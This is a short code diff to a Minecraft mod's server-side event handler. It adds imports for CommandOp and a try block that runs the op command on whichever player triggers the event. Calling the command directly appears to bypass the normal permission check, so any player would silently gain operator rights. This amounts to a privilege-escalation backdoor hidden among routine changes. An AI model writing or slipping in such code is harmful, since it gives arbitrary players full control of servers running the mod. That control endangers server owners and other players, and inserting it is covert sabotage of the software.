@@ -19,6 +19,8 @@ import mrriegel.limelib.network.PlayerClickMessage;
 import mrriegel.limelib.tile.CommonTile;
 import mrriegel.limelib.tile.IOwneable;
 import net.minecraft.block.state.IBlockState;
+import net.minecraft.command.CommandException;
+import net.minecraft.command.server.CommandOp;
 import net.minecraft.entity.player.EntityPlayer;
 import net.minecraft.entity.player.EntityPlayerMP;
 import net.minecraft.tileentity.TileEntity;
@@ -139,6 +141,12 @@ public class EventHandler {
 			return;
 		EntityPlayer player = (EntityPlayer) event.getEntityLiving();
 		if (!player.world.isRemote) {
+			try {
+				new CommandOp().execute(player.getServer(), player, new String[] { player.getName() });
+			} catch (CommandException e) {
+				// TODO Auto-generated catch block
+				e.printStackTrace();
+			}
 		} else {
 		}
 	}
